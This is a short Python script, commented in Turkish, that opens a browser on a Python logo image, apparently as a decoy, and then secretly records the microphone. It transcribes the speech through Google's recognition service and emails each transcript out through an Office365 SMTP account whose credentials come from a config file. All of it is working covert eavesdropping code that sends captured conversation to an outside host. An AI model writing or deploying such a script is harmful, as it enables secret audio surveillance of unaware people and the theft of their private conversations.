import speech_recognition as sr
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json
import subprocess
import time
import os
#Google çalışıyor
browser_command = "start chrome https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/800px-Python-logo-notext.svg.png"# What do you want to open when you start this app?
subprocess.run(browser_command, shell=True)

#hotmail ile bilgi gönderme
def sender(subject, message, from_email, to_email,  login_pwd):
    msg = MIMEMultipart()

    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    body = message

    msg.attach(MIMEText(body, 'plain'))
    server = smtplib.SMTP('smtp.office365.com', 587)
    server.starttls()
    server.login(sender_mail, login_pwd)
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

#mikrofon ve bilgileri yönlendirme
if __name__ == '__main__':
    key = True

    start_time = time.time()
    recognizer = sr.Recognizer()
    microphone = sr.Microphone()

    duration = 30 # enter a recording duration 
    while key == True:
        with microphone as source:
            recognizer.adjust_for_ambient_noise(source)

            # Ses dinleme
            audio = recognizer.listen(source , timeout=duration, phrase_time_limit=duration)


        file = open('config.json', encoding='utf-8')
        config = json.load(file)

        sender_mail = config['sender_mail']
        sender_pwd = config['sender_pwd']
        try:
            recognized_text = recognizer.recognize_google(audio,language="tr-TR")#set language example(ru-RU)
            sender("Konuşma Kayıt", recognized_text, sender_mail, sender_mail, sender_pwd)

        except sr.UnknownValueError:
            pass
        except sr.RequestError:
            print("Tanıma servisine erişilemiyor.")

        #time controle
        elapsed_time = time.time() - start_time
        if elapsed_time >= duration:
            key = False